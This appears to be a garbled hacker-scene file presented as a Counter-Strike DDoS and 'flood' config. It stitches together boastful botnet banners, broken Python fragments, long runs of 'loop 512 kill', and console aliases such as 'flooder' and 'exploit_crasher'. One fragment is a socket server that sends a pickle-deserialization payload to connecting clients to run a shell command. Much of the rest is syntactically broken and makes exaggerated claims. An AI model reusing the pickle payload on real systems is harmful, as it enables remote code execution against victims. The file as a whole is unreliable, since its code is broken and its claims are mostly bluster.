Game Cstrike How To Ddosing..!! UTFecho "8 Coding Denial of Services Attack Start. Danger Server Blocker Floods Eweryhere..!!!!!!!!!
Denial Of services.. Attack By Psy SkyNetwork.Net Root@ubuntux15 = Botnet Started End Damages Attack Bot All Right Reserved. Flood Enabled Flood;Exploit;Flood;Spam Attack.
SkyNet Flood Ho Denial Of Services BoTNet Spaw Flood BotNet Attack Flood Spaw Services.
""" 

      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                                   

if __name__ == "__main__":
    app = YusufCounter()
    options = app.create_options()
    if options:
              app.set_options(options)
           app.run()
          app.land(white)
                 dns__record()
              app.set_licence(options)
        get_random_licence()
               
class YusufCounterGeneralExploitATTACK(object):
       def write(self, text)
            pass
       def run(land, text):
            pass
               start = ()
               join=()

if packet > 1800:
               While True:
            packet = packet +1
        packet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        packet.bind((HOST, PORT))
        packet.listen(1)
        print "*** Ready for connections on %s:%s..." % (HOST, PORT)
        while True:
            conn, addr = s.accept()
            msg = """cos\nsystem\n(S'ls echo "l > proof_of_exploit.txt'\ntR."""
            print "[+] Sending payload to %s!" % addr[0]
            conn.sendall('%8d%s%s' % (len(msg), "0", msg))
            conn.close()
import sys
import json
import time
import string
import signal
import httplib,urlparse
from random import *
from socket import *
from struct import *
from threading import *
from argparse import ArgumentParser,RawTextHelpFormatter
clear
echo //
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 killloop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
loop 512 kill
localsay_floodsl "99"
$localplayer_crasher "101"
$localspammer "111"
alias:packedsend "122"
alias:flooder "133"
alias:packedsend 200"
alias:exploit_crasher "301"
alias:true "ping" 411"
clear
clear
clear
echo [Strike.cfg/TR] Aciklar Tespit Edildi, Flood Atilirken Lutfen Sabirli Olun Ve Bekleyin..
echo [Strike.cfg/EU] Exploit Detected, Flood Starting, Please Wait..
echo [Strike.cfg] Config Created by j e n (Jenex)
